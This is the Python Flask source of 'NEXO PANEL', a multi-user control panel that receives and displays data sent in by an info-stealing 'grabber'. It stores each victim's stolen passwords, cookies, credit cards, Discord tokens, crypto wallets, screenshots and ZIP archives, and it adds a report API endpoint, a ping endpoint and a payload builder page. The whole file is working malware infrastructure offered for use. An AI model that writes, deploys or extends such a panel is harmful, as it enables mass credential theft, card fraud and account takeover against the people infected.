"""
███╗   ██╗███████╗██╗  ██╗ ██████╗     ██████╗  █████╗ ███╗   ██╗███████╗██╗
████╗  ██║██╔════╝╚██╗██╔╝██╔═══██╗    ██╔══██╗██╔══██╗████╗  ██║██╔════╝██║
██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║    ██████╔╝███████║██╔██╗ ██║█████╗  ██║
██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║    ██╔═══╝ ██╔══██║██║╚██╗██║██╔══╝  ██║
██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝    ██║     ██║  ██║██║ ╚████║███████╗███████╗
╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝     ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝
                                NEXO PANEL v1.0
                                 By LO & ENI
"""

import os
import json
import uuid
import base64
import hashlib
import secrets
from datetime import datetime
from functools import wraps

from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory, flash
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', secrets.token_hex(32))
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL', 'sqlite:///nexo.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB max

# Fix for PostgreSQL on Railway
if app.config['SQLALCHEMY_DATABASE_URI'].startswith('postgres://'):
    app.config['SQLALCHEMY_DATABASE_URI'] = app.config['SQLALCHEMY_DATABASE_URI'].replace('postgres://', 'postgresql://', 1)

db = SQLAlchemy(app)

# Ensure upload folder exists
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)


# ==================== MODELS ====================

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(256), nullable=False)
    panel_id = db.Column(db.String(32), unique=True, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    victims = db.relationship('Victim', backref='owner', lazy=True)

    def set_password(self, password):
        self.password_hash = generate_password_hash(password)

    def check_password(self, password):
        return check_password_hash(self.password_hash, password)


class Victim(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    victim_id = db.Column(db.String(32), unique=True, nullable=False)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)

    # System Info
    hostname = db.Column(db.String(100))
    username = db.Column(db.String(100))
    os_info = db.Column(db.String(200))
    cpu = db.Column(db.String(200))
    public_ip = db.Column(db.String(50))
    local_ip = db.Column(db.String(50))
    mac_address = db.Column(db.String(50))
    country = db.Column(db.String(50))
    city = db.Column(db.String(100))
    isp = db.Column(db.String(200))

    # Data counts
    passwords_count = db.Column(db.Integer, default=0)
    cookies_count = db.Column(db.Integer, default=0)
    cards_count = db.Column(db.Integer, default=0)
    tokens_count = db.Column(db.Integer, default=0)
    wallets_count = db.Column(db.Integer, default=0)

    # Data (stored as JSON)
    passwords = db.Column(db.Text)  # JSON
    cookies = db.Column(db.Text)    # JSON
    credit_cards = db.Column(db.Text)  # JSON
    discord_tokens = db.Column(db.Text)  # JSON
    wallets = db.Column(db.Text)    # JSON

    # Files
    screenshot_path = db.Column(db.String(500))
    zip_path = db.Column(db.String(500))

    # Timestamps
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    last_seen = db.Column(db.DateTime, default=datetime.utcnow)

    # Status
    is_online = db.Column(db.Boolean, default=False)
    notes = db.Column(db.Text)


# ==================== AUTH DECORATOR ====================

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function


# ==================== ROUTES ====================

@app.route('/')
def index():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')

        user = User.query.filter_by(username=username).first()

        if user and user.check_password(password):
            session['user_id'] = user.id
            session['username'] = user.username
            session['panel_id'] = user.panel_id
            return redirect(url_for('dashboard'))

        flash('Invalid username or password', 'error')

    return render_template('login.html')


@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')
        confirm_password = request.form.get('confirm_password', '')

        if len(username) < 3:
            flash('Username must be at least 3 characters', 'error')
        elif len(password) < 6:
            flash('Password must be at least 6 characters', 'error')
        elif password != confirm_password:
            flash('Passwords do not match', 'error')
        elif User.query.filter_by(username=username).first():
            flash('Username already exists', 'error')
        else:
            user = User(
                username=username,
                panel_id=uuid.uuid4().hex
            )
            user.set_password(password)
            db.session.add(user)
            db.session.commit()

            flash('Account created! Please login.', 'success')
            return redirect(url_for('login'))

    return render_template('register.html')


@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))


@app.route('/dashboard')
@login_required
def dashboard():
    user = User.query.get(session['user_id'])
    victims = Victim.query.filter_by(user_id=user.id).order_by(Victim.created_at.desc()).all()

    # Stats
    total_victims = len(victims)
    total_passwords = sum(v.passwords_count for v in victims)
    total_cookies = sum(v.cookies_count for v in victims)
    total_cards = sum(v.cards_count for v in victims)
    total_tokens = sum(v.tokens_count for v in victims)
    total_wallets = sum(v.wallets_count for v in victims)

    stats = {
        'victims': total_victims,
        'passwords': total_passwords,
        'cookies': total_cookies,
        'cards': total_cards,
        'tokens': total_tokens,
        'wallets': total_wallets
    }

    return render_template('dashboard.html',
                         user=user,
                         victims=victims,
                         stats=stats)


@app.route('/victim/<victim_id>')
@login_required
def victim_detail(victim_id):
    victim = Victim.query.filter_by(victim_id=victim_id).first_or_404()

    # Verify ownership
    if victim.user_id != session['user_id']:
        return redirect(url_for('dashboard'))

    # Parse JSON data
    passwords = json.loads(victim.passwords) if victim.passwords else []
    cookies = json.loads(victim.cookies) if victim.cookies else []
    credit_cards = json.loads(victim.credit_cards) if victim.credit_cards else []
    discord_tokens = json.loads(victim.discord_tokens) if victim.discord_tokens else []
    wallets = json.loads(victim.wallets) if victim.wallets else []

    return render_template('victim.html',
                         victim=victim,
                         passwords=passwords,
                         cookies=cookies,
                         credit_cards=credit_cards,
                         discord_tokens=discord_tokens,
                         wallets=wallets)


@app.route('/victim/<victim_id>/delete', methods=['POST'])
@login_required
def delete_victim(victim_id):
    victim = Victim.query.filter_by(victim_id=victim_id).first_or_404()

    if victim.user_id != session['user_id']:
        return redirect(url_for('dashboard'))

    # Delete files
    if victim.screenshot_path and os.path.exists(victim.screenshot_path):
        os.remove(victim.screenshot_path)
    if victim.zip_path and os.path.exists(victim.zip_path):
        os.remove(victim.zip_path)

    db.session.delete(victim)
    db.session.commit()

    flash('Victim deleted', 'success')
    return redirect(url_for('dashboard'))


@app.route('/uploads/<path:filename>')
@login_required
def uploaded_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)


@app.route('/settings')
@login_required
def settings():
    user = User.query.get(session['user_id'])

    # Generate grabber URL
    base_url = request.host_url.rstrip('/')
    api_url = f"{base_url}/api/{user.panel_id}/report"

    return render_template('settings.html', user=user, api_url=api_url)


@app.route('/builder')
@login_required
def builder():
    user = User.query.get(session['user_id'])
    base_url = request.host_url.rstrip('/')
    api_url = f"{base_url}/api/{user.panel_id}/report"

    return render_template('builder.html', user=user, api_url=api_url)


# ==================== API ENDPOINTS ====================

@app.route('/api/<panel_id>/report', methods=['POST'])
def api_report(panel_id):
    """Endpoint to receive data from grabber"""

    # Find user by panel_id
    user = User.query.filter_by(panel_id=panel_id).first()
    if not user:
        return jsonify({'error': 'Invalid panel ID'}), 404

    try:
        # Get JSON data
        if request.is_json:
            data = request.json
        else:
            data = json.loads(request.form.get('data', '{}'))

        # Create victim
        victim = Victim(
            victim_id=uuid.uuid4().hex,
            user_id=user.id,
            hostname=data.get('system_info', {}).get('hostname', 'Unknown'),
            username=data.get('system_info', {}).get('username', 'Unknown'),
            os_info=data.get('system_info', {}).get('os', 'Unknown'),
            cpu=data.get('system_info', {}).get('cpu', 'Unknown'),
            public_ip=data.get('system_info', {}).get('public_ip', 'Unknown'),
            local_ip=data.get('system_info', {}).get('local_ip', 'Unknown'),
            mac_address=data.get('system_info', {}).get('mac', 'Unknown'),
            country=data.get('system_info', {}).get('country', 'Unknown'),
            city=data.get('system_info', {}).get('city', 'Unknown'),
            isp=data.get('system_info', {}).get('isp', 'Unknown'),
            passwords_count=len(data.get('passwords', [])),
            cookies_count=len(data.get('cookies', [])),
            cards_count=len(data.get('credit_cards', [])),
            tokens_count=len(data.get('tokens', [])),
            wallets_count=len(data.get('wallets', [])),
            passwords=json.dumps(data.get('passwords', [])),
            cookies=json.dumps(data.get('cookies', [])),
            credit_cards=json.dumps(data.get('credit_cards', [])),
            discord_tokens=json.dumps(data.get('tokens', [])),
            wallets=json.dumps(data.get('wallets', []))
        )

        # Handle screenshot
        if 'screenshot' in request.files:
            screenshot = request.files['screenshot']
            if screenshot.filename:
                filename = f"{victim.victim_id}_screenshot.png"
                filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                screenshot.save(filepath)
                victim.screenshot_path = filename
        elif data.get('screenshot_base64'):
            # Decode base64 screenshot
            try:
                screenshot_data = base64.b64decode(data['screenshot_base64'])
                filename = f"{victim.victim_id}_screenshot.png"
                filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                with open(filepath, 'wb') as f:
                    f.write(screenshot_data)
                victim.screenshot_path = filename
            except:
                pass

        # Handle ZIP file
        if 'zipfile' in request.files:
            zipfile = request.files['zipfile']
            if zipfile.filename:
                filename = f"{victim.victim_id}_data.zip"
                filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                zipfile.save(filepath)
                victim.zip_path = filename

        db.session.add(victim)
        db.session.commit()

        return jsonify({'success': True, 'victim_id': victim.victim_id}), 200

    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/<panel_id>/ping', methods=['POST'])
def api_ping(panel_id):
    """Endpoint for grabber to check if panel is online"""
    user = User.query.filter_by(panel_id=panel_id).first()
    if user:
        return jsonify({'status': 'ok', 'panel': 'NEXO'}), 200
    return jsonify({'error': 'Invalid panel'}), 404


# ==================== ERROR HANDLERS ====================

@app.errorhandler(404)
def not_found(e):
    return render_template('404.html'), 404


@app.errorhandler(500)
def server_error(e):
    return render_template('500.html'), 500


# ==================== INIT ====================

with app.app_context():
    db.create_all()


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
